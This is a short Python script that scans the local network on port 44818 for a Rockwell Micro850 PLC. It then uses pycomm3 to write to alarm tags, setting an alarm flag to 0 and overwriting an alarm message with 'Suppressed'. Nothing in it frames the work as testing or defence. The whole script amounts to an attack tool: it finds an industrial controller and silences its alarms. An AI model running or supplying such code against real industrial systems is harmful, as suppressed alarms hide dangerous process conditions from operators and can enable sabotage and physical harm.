from pycomm3 import LogixDriver
import socket
import sys

def find_plc_ip():
    """
    Scans the local network to find the IP address of the Rockwell Micro850 PLC.
    This is a basic implementation and may need adjustments based on the network setup.
    """
    target_port = 44818  # Default port for Allen-Bradley PLCs
    local_ip = socket.gethostbyname(socket.gethostname())
    ip_parts = local_ip.split('.')
    base_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}."

    for i in range(1, 255):
        ip = f"{base_ip}{i}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, target_port))
                if result == 0:
                    print(f"Found PLC at IP: {ip}")
                    return ip
        except Exception as e:
            print(f"Error scanning IP {ip}: {e}")
    print("PLC not found on the network.")
    return None

def suppress_alarms(plc_ip):
    """
    Connects to the PLC and suppresses alarms by modifying alarm bits or flags.
    """
    try:
        with LogixDriver(plc_ip) as plc:
            # Example: Suppress an alarm by setting a flag to a fixed value
            alarm_flag = "Alarm_Flag"  # Replace with the actual tag name for the alarm flag
            plc.write(alarm_flag, 0)   # Set the alarm flag to 0 to suppress it

            # Example: Modify a protocol message to suppress an alarm
            protocol_message = "Alarm_Message"  # Replace with the actual tag name for the protocol message
            plc.write(protocol_message, "Suppressed")  # Modify the message

            print("Alarms have been suppressed.")
    except Exception as e:
        print(f"Error connecting to PLC or suppressing alarms: {e}")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("Exiting script. PLC IP not found.")
        sys.exit(1)

    # Step 2: Suppress alarms on the PLC
    suppress_alarms(plc_ip)